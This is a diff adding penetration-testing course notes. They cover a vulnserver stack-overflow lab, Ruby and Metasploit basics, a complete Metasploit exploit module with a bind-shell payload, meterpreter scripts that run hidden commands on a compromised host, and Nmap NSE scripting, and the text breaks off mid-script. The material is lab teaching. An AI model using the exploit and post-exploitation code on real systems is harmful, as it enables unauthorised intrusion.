@@ -1,0 +1,3590 @@
+########
+# Tips #
+########
+https://ired.team/offensive-security/powershell-constrained-language-mode-bypass
+
+
+
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise from the links below (copy nc.exe into the c:\windows\system32 directory)
+http://45.63.104.73/ExploitLab.zip
+http://45.63.104.73/nc-password-is-netcat.zip
+http://45.63.104.73/1-SEH.zip
+http://45.63.104.73/WarFTP.zip
+http://45.63.104.73/SEH.zip
+http://45.63.104.73/sws.zip
+http://45.63.104.73/tftpd.zip
+http://45.63.104.73/ffvlc.zip
+http://45.63.104.73/pdf-exploit.zip
+ 
+ 
+- Extract the ExploitLab.zip file to your Desktop
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+ 
+---------------------------Type This-----------------------------------
+ 
+nc localhost 9999
+--------------------------------------------------------------------------
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\student\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+ 
+ 
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+ 
+ 
+ 
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+ 
+1. What is the target platform that this exploit works against?
+2. What is the variable name for the distance to EIP?
+3. What is the actual distance to EIP in bytes?
+4. Describe what is happening in the variable ‘junk2’
+ 
+ 
+ 
+ 
+Analysis of the training walk-through based on EID: 15689:
+http://45.63.104.73/ff.zip
+ 
+ 
+ 
+ 
+ff1.py
+1. What does the sys module do? Call System Commands
+2. What is sys.argv[1] and sys.argv[2]?
+3. What application entry point is being attacked in this script?
+ 
+ 
+ 
+ff2.py
+1. Explain what is happening in lines 18 - 20 doing.
+2. What pattern_create.rb doing and where can I find it?
+3. Why can’t I just double click the file to run this script?
+ 
+ 
+ 
+ff3.py
+1. Explain what is happening in lines 17 - to 25?
+2. Explain what is happening in lines 30 - to 32?
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+ff4.py
+1. Explain what is happening in lines 13 - to 15.
+2. Explain what is happening in line 19.
+3. What is the total length of buff?
+ 
+ 
+ 
+Ff5.py
+1. Explain what is happening in line 15.
+2. What is struct.pack?
+3. How big is the shellcode in this script?
+ 
+ 
+ 
+ff6.py
+1. What is the distance to EIP?
+2. How big is the shellcode in this script?
+3. What is the total byte length of the data being sent to this app?
+ 
+ 
+ 
+ 
+ff7.py
+1. What is a tuple in python?
+2. How big is the shellcode in this script?
+3. Did your app crash in from this script?
+ 
+ 
+ 
+ 
+ff8.py
+1. How big is the shellcode in this script?
+2. What is try/except in python?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ff9.py
+1. What is going on in lines 19 and 20?
+2. What is the length of the NOPs?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ 
+ff010.py
+1. What is going on in lines 18 - 20?
+2. What is going on in lines 29 - 32?
+3. How would a stack adjustment help this script?
+
+
+Required review videos to watch tonight:
+----------------------------------------
+https://www.youtube.com/playlist?list=PLWpmLW-3AVsjcz_VJFvofmIFVTk7T-Ukl
+Please watch videos 1-5 tonight. Vivek has a deep accent so I understand that it may be difficult but his material is very good - probably the best on the internet today.
+
+Recommended (not required) videos to watch tonight:
+---------------------------------------------------
+For more background on Assembly I would recommend the following video series (videos 1-11):
+https://www.youtube.com/playlist?list=PL6brsSrstzga43kcZRn6nbSi_GeXoZQhR
+Again, you DO NOT have to watch these tonight but if you are really interested in the subject of exploit development I think they will be very helpful.
+
+
+
+---------------------------------------------------------------------------------------------------------------------############################
+# Day 2: Ruby Fundamentals #
+############################
+ 
+ 
+ 
+- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
+scientist and programmer from Japan. It is a cross-platform dynamic language.
+ 
+- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
+on Rails is a framework that is written in Ruby.
+ 
+- Ruby's file name extensions are .rb and .rbw.
+ 
+- official website of this
+ 
+- language: www.ruby-lang.org.
+ 
+ 
+- interactive Shell called Ruby Shell
+ 
+- open up the interactive console and play around.
+ 
+---------------------------Type This-----------------------------------
+irb
+-----------------------------------------------------------------------
+ 
+ 
+- Math, Variables, Classes, Creating Objects and Inheritance
+ 
+ 
+The following arithmetic operators:
+    Addition operator (+) — 10 + 23
+    Subtraction operator (-) — 1001 - 34
+    Multiplication operator (*) — 5 * 5
+    Division operator (/) — 12 / 2
+ 
+ 
+ 
+- Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
+operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
+30. Again, 69 is assigned to y, and then y is incremented by 33.
+ 
+---------------------------Type This-----------------------------------
+x = 25
+x + 30
+y = 69
+y+33
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Let's look at creating classes and creating objects.
+ 
+- Here, the name of the class is Attack. An object has its properties and methods.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Attack
+attr_accessor :of, :sqli, :xss
+end
+-----------------------------------------------------------------------
+ 
+ 
+What is nil?
+Reference:
+https://www.codecademy.com/en/forum_questions/52a112378c1cccb0f6001638
+ 
+nil is the Ruby object that represents nothingness. Whenever a method doesn’t return a useful value, it returns nil. puts and print are methods that return nil:
+ 
+Since the Ruby Console always shows the value of the last statement or expression in your code, if that last statement is print, you’ll see the nil.
+ 
+To prevent the nil from "sticking" to the output of print (which doesn’t insert a line break), you can print a line break after it, and optionally put some other value as the last statement of your code, then the Console will show it instead of nil:
+ 
+ 
+ 
+ 
+ 
+# Now that we have created the classes let's create the objects
+---------------------------Type This-----------------------------------
+first_attack = Attack.new
+first_attack.of = "stack"
+first_attack.sqli = "blind"
+first_attack.xss = "dom"
+puts first_attack.of
+puts first_attack.sqli
+puts first_attack.xss
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
+inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
+one object can access the properties/attributes of another object of a different class. Inheritance makes your
+programming life easier by maximizing code reuse.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Exploitframeworks
+attr_accessor :scanners, :exploits, :shellcode, :postmodules
+end
+class Metasploit < Exploitframeworks
+end
+class Canvas < Exploitframeworks
+end
+class Coreimpact < Exploitframeworks
+end
+class Saint < Exploitframeworks
+end
+class Exploitpack < Exploitframeworks
+end
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
+ 
+- Let's create a simple method. A method is used to perform an action and is generally called with an object.
+ 
+- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
+it will print this string: "We are Learning how to PenTest"
+ 
+- An object named 'bo' is created, which is used to call the method.
+ 
+ 
+---------------------------Type This-----------------------------------
+class Msfnl
+def learning
+puts "We are Learning how to PenTest"
+end
+end
+-----------------------------------------------------------------------
+ 
+#Now let's define an object for our Method
+ 
+---------------------------Type This-----------------------------------
+joe = Msfnl.new
+joe.learning
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- An argument is a value or variable that is passed to the function while calling it. In the following example, while
+calling the puts() function, we are sending a string value to the function. This string value is used by the
+function to perform some particular operations.
+ 
+puts ("Pentesting")
+ 
+ 
+- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will
+explain some useful string functions with an example.
+ 
+- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the
+reverse function reverses a string. The following example demonstrates how to use the string functions.
+ 
+---------------------------Type This-----------------------------------
+55.class
+"I Love Programming".class
+"I Love Pentesting".length
+"Pown that box".upcase
+"Love" + "To Root Boxes"
+"evil".reverse
+"evil".reverse.upcase
+-----------------------------------------------------------------------
+ 
+ 
+-  expressions and shortcuts. In the below example, 'a' is an operand, '3' is an operand,  '=' is
+an operator, and 'a=3' is the expression. A statement consists of one or multiple expressions. Following are the
+examples of some expressions.
+ 
+---------------------------Type This-----------------------------------
+a = 3
+b = 6
+a+b+20
+d = 44
+f = d
+puts f
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
+assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
+statements to understand the shortcuts.
+ 
+---------------------------Type This-----------------------------------
+g = 70
+g = g+44
+g += 33
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is incremented by 33 and then the total value is assigned to g.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+g *= 3
+-----------------------------------------------------------------------
+ 
+ 
+- In the above statement, g is multiplied with 3 and then assigned to g.
+ 
+- Example
+ 
+- Comparison Operators, Loops, Data Types, and Constants
+ 
+- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
+how to use the following comparison operators.
+ 
+'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
+variable or constant. If it's less than the other, the 'less than' operator returns true.
+ 
+'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
+or constant. If it's equal to the other, the 'equal to' operator returns true.
+ 
+'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
+variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
+ 
+---------------------------Type This-----------------------------------
+numberofports = 55
+puts "number of ports found during scan" if numberofports < 300
+numberofports = 400
+puts "number of ports found during scan" if numberofports < 300
+puts "number of ports found during scan" if numberofports == 300
+puts "number of ports found during scan" if numberofports != 300
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Example
+ 
+ 
+- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
+ 
+- This operator is generally used to combine multiple conditions.
+- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
+ 
+- following example to understand how this operator works.
+ 
+---------------------------Type This-----------------------------------
+ports = 100
+puts "number of ports found on the network" if ports<100 || ports>200
+puts "number of ports found on the network" if ports<100 || ports>75
+-----------------------------------------------------------------------
+ 
+# unless
+ 
+---------------------------Type This-----------------------------------
+portsbelow1024 = 50
+puts "If the ports are below 1024" unless portsbelow1024 < 1000
+puts "If the ports are below 1024" unless portsbelow1024 < 1055
+puts "If the ports are below 1024" unless portsbelow1024 < 20
+-----------------------------------------------------------------------
+ 
+- The 'unless' keyword is used to do something programmatically unless a condition is true.
+ 
+ 
+ 
+- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
+ 
+- See the following example to understand how a string is printed 10 times on the screen using a loop.
+ 
+---------------------------Type This-----------------------------------
+10.times do puts "infosecaddicts" end
+-----------------------------------------------------------------------
+ 
+# Or use the curly braces
+ 
+---------------------------Type This-----------------------------------
+10.times {puts "infosecaddicts"}
+-----------------------------------------------------------------------
+ 
+ 
+- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
+working with different data types. Data type conversion is also known as type casting.
+ 
+ 
+ 
+- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
+change the value of a constant, you will see a warning message.
+ 
+ 
+ 
+ 
+- Multiple Line String Variable, Interpolation, and Regular Expressions
+ 
+- A multiple line string variable lets you assign the value to the string variable through multiple lines.
+ 
+---------------------------Type This-----------------------------------
+infosecaddicts = <<mark
+welcome
+to the
+best
+metasploit
+course
+on the
+market
+mark
+puts infosecaddicts
+-----------------------------------------------------------------------
+ 
+ 
+- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
+it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
+Examine the following example to understand how interpolation works in Ruby.
+ 
+References:
+https://stackoverflow.com/questions/10869264/meaning-of-in-ruby
+ 
+ 
+---------------------------Type This-----------------------------------
+a = 4
+b = 6
+puts "a * b = a*b"
+puts " #{a} * #{b} = #{a*b} "
+person = "Joe McCray"
+puts "IT Security consultant person"
+puts "IT Security consultant #{person}"
+-----------------------------------------------------------------------
+ 
+- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
+ 
+ 
+ 
+ 
+ 
+- Character classes
+---------------------------Type This-----------------------------------
+infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
+"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
+"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
+-----------------------------------------------------------------------
+ 
+ 
+- Arrays, Push and Pop, and Hashes
+ 
+ 
+- In the following example, numbers is an array that holds 6 integer numbers.
+ 
+ 
+---------------------------Type This-----------------------------------
+numbers = [2,4,6,8,10,100]
+puts numbers[0]
+puts numbers[4]
+numbers[2] = 150
+puts numbers
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
+ 
+ 
+---------------------------Type This-----------------------------------
+framework = []
+framework << "modules"
+framework << "exploits"
+framework << "payloads"
+framework.pop
+framework.shift
+-----------------------------------------------------------------------
+ 
+- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
+that is used to access the element.
+ 
+ 
+- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
+In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
+respective values: 'what module should you use', 'Windows XP' and 'SSH'.
+ 
+---------------------------Type This-----------------------------------
+metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
+print metasploit.size
+print metasploit["microsoft"]
+metasploit['microsoft'] = 'redhat'
+print metasploit['microsoft']
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Writing Ruby Scripts
+ 
+ 
+- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
+this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
+someone made to look for a specific port. The port that it is looking for is port 21 FTP.
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###########################
+# Metasploit Fundamentals #
+###########################
+ 
+- Let's take a little look at Metasploit Framework
+ 
+- First, we should take note of the different directories, the Modular Architecture.
+ 
+The modules that make up the Modular Architecture are
+Exploits
+Auxiliary
+Payload
+Encoder
+Nops
+ 
+ 
+Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
+ 
+are
+ 
+Modules
+Scripts
+Plugins
+External
+Data
+Tools
+ 
+- Let's take a look inside the Metasploit directory and see what's the
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework
+ls
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Now let's take a look inside the Modules directory and see what's there.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules
+ls
+-----------------------------------------------------------------------
+ 
+       
+The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
+not necessarily need to - have a shell or session started on a machine.
+ 
+The exploits directory has our modules that we need to pop a shell on a box.
+The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
+like Burp Suite
+- Let's take a look at the external directory
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/external
+ls
+-----------------------------------------------------------------------
+ 
+- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/data
+ls
+-----------------------------------------------------------------------
+ 
+- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
+brute-forcing
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/data/wordlists
+ls
+-----------------------------------------------------------------------
+ 
+- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
+once a session is created.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/data/meterpreter
+ls
+-----------------------------------------------------------------------
+ 
+- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
+like escalating privileges and dumping hashes.
+ 
+These are being phased out, though, and post-exploitation modules are what is being more preferred.
+The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
+find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
+for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
+custom shellcode.
+ 
+The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
+to do with other programs to make things like importing and exporting reports simple.
+Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
+the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
+modules we're going to have a better understanding of where everything needs to go.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules/exploits
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- The exploits directory is split up into several different directories, each one housing exploits for different types
+of systems. I.E. Windows, Unix, OSX, dialup and so on.
+Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
+into categories of different types of services/programs, so that you can pick out an exploit specifically for the
+service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
+for us.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules/auxiliary/
+ls
+-----------------------------------------------------------------------      
+ 
+ 
+- And a little further into the directory, let's take a look at what's in the scanner directory
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules/auxiliary/scanner/
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- And one more folder deeper into the structure, let's take a look in the portscan folder
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------    
+ 
+- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
+and report them back to us in a nice, easily readable format.
+ 
+cat tcp.rb
+   
+ 
+ 
+- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
+once you have a session on a machine.
+Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
+succeeds.
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework/modules/payloads/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
+application for it to be used as.
+Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
+do everything once you have that shell calling back to you.
+Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
+the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
+much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
+to download Stages payloads.
+ 
+ 
+- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
+shells.
+---------------------------Type This-----------------------------------
+cd singles
+cd windows
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
+see what it actually does.
+---------------------------Type This-----------------------------------
+cat adduser.rb
+-----------------------------------------------------------------------
+ 
+Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
+the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
+it gives Windows to add the user to the system.
+ 
+ 
+- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
+ 
+windows/shell/bind_tcp or windows/shell/reverse_tcp
+---------------------------Type This-----------------------------------
+cd ../../stagers
+ls
+-----------------------------------------------------------------------
+   
+ 
+ 
+- Again, we can see that we have stagers for multiple systems and code types.
+---------------------------Type This-----------------------------------
+ls windows/
+-----------------------------------------------------------------------    
+ 
+ 
+As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
+machine, so we can upload or download our stage payloads and execute commands.
+Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
+our stagers...
+---------------------------Type This-----------------------------------
+cd ../stages
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Again, we can see that our stages are coded for particular operating systems and languages.
+We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
+victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
+if any.
+ 
+- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
+already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
+so we can impersonate other users on the system in hopes of elevating our privileges.
+---------------------------Type This-----------------------------------
+cd ../../../post/
+ls
+cd windows/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
+the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
+escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
+possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
+memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
+ 
+------------------------------
+ 
+ 
+ 
+ 
+------------------------------------------
+ 
+------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+cd /usr/share/metasploit-framework/modules/exploits/windows/misc
+ 
+nano vulnserv.rb    
+-------(paste the code below into this file)-------
+#
+#
+# Quick Metasploit exploit for vulnserver.exe
+# Written by: Joe McCray
+# Email: joe@strategicsec.com
+#
+# Place this exploit in:
+# /usr/share/metasploit-framework/modules/exploits/windows/misc
+#
+require 'msf/core'
+ 
+class Metasploit3 < Msf::Exploit::Remote
+    include Msf::Exploit::Remote::Tcp
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'Custom vulnerable server stack overflow',
+            'Description'    => %q{
+                This module exploits a stack overflow in an app called
+                vulnserver that is designed to teach simple exploitation.
+                },
+            'Author'         => [ 'Joe McCray' ],
+            'DefaultOptions' =>
+                {
+                    'EXITFUNC' => 'process',
+                },
+            'Payload'        =>
+                {
+                    'Space'    => 800,
+                    'BadChars' => "\x00\x20",
+                },
+            'Platform'       => 'win',
+ 
+            'Targets'        =>
+                [
+                    [
+                        'Windows XP SP3 EN',
+                            {
+                                'Ret' => 0x625011AF,
+                            }
+                    ],
+                ],
+            'DefaultTarget' => 0,
+ 
+            'Privileged'     => false
+            ))
+ 
+            register_options(
+            [
+                Opt::RPORT(9999)
+            ], self.class)
+    end
+ 
+    def exploit
+        connect
+        sock.recv(1024)
+ 
+        p =  "\x41" * 16
+        p << payload.encoded
+ 
+        hdr =  "TRUN ."
+        boom = pattern_create(3000)
+        boom[2006, 4] = [target.ret].pack('V')  # EIP value
+        boom[2010, p.length] = p
+ 
+        sploit = hdr + boom
+ 
+        sock.put(sploit)
+ 
+        handler
+        disconnect
+ 
+    end
+ 
+end
+------------------end of copy/paste content --------------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cd /usr/share/metasploit-framework
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST CHANGEME-TO-YOUR-WIN7-IP
+set RPORT 9999
+exploit
+-----------------------------------------------------------------------
+
+
+
+
+
+########################################
+# Down and dirty Meterpreter Scripting #
+########################################
+
+-----------------------------------------------------------------------
+- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit
+ 
+can offer.  This will also show you the flexibility of the Meterpreter scripts.
+ 
+- We're going to start off with a simple Hello World script first.  
+
+- Keep your meterpreter shell open from the previous lab exercises, and in a new Linux command window type the following: 
+---------------------------Type This-----------------------------------  
+echo 'print_status("Hello World")' > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+-----------------------------------------------------------------------
+ 
+- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
+ 
+- Lets test out our helloworld.rb Meterpreter script.
+ 
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+----------------------------------------------------------------------- 
+ 
+- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
+ 
+- Open /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb in your favorite and add following
+ 
+line.
+---------------------------Type This-----------------------------------
+vi /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+-------(paste the code below into this file)-------
+print_error("this is an error!")
+print_line("this is a line")
+-----------------------------------------------------------------------
+
+ 
+- Now run the script:
+ 
+meterpreter> run helloworld
+ 
+ 
+- Now that we have the basics down, we're going to do something a little more exciting.  
+- The architecture to follow when creating these scripts goes as follows:
+ 
+def getinfo(session)
+        begin
+            <stuff goes here>
+        rescue ::Exception => e
+            <stuff goes here>
+        end
+end
+ 
+-----------------------------------------------------------------------
+
+
+
+- Copy and paste the following code into our helloworld.rb script:
+---------------------------Type This-----------------------------------
+vi /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+-------(paste the code below into this file)-------
+def getinfo(session)
+    begin
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
+       print_status("Getting system information ...")
+       print_status("The target machine OS is #{sysnfo['OS']}")
+       print_status("The computer name is #{'Computer'} ")
+       print_status("Script running as #{runpriv}")
+    rescue ::Exception => e
+      print_error("The following error was encountered #{e}")
+   end
+end
+ 
+getinfo(client)
+--------------------------------------------------------------------------
+ 
+ 
+- Now run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+----------------------------------------------------------------------- 
+ 
+- We can expand it by adding actual system commands to the script, lets look at how we can do this.
+---------------------------Type This-----------------------------------
+vi /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+-------(paste the code below into this file)-------
+def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+       begin
+          print_status "running command #{cmd}"
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+          while(d = r.channel.read)
+ 
+             print_status("#{d}")
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+       end
+    end
+ end
+ 
+commands = [ "set",
+    "ipconfig  /all",
+    "arp -a"]
+ 
+list_exec(client,commands)
+------------------------------------------------------------------------
+ 
+ 
+- Run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+----------------------------------------------------------------------- 
+ 
+
+
+
+#########################
+# Meterpreter Challenge #
+#########################
+Note: Add all of the commands from the script below to your helloworld.rb script:
+https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/meterpreter/winenum.rb
+ 
+ 
+ 
+---------------------------------------------------------------------------------
+
+
+
+#####################################
+# Writing Your Own Nmap NSE Scripts #
+#####################################
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+-- The Rule Section --
+portrule = function(host, port)
+    return port.protocol == "tcp"
+            and port.number == 80
+            and port.state == "open"
+end
+ 
+-- The Action Section --
+action = function(host, port)
+    return "Munich Hacking!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
+ 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+local shortport = require "shortport"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+ 
+-- The Action Section --
+action = function(host, port)
+    return "Munich Hacking!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+OK, now let's have some fun with my buddy Carlos Perez's website.
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+    return response.status
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
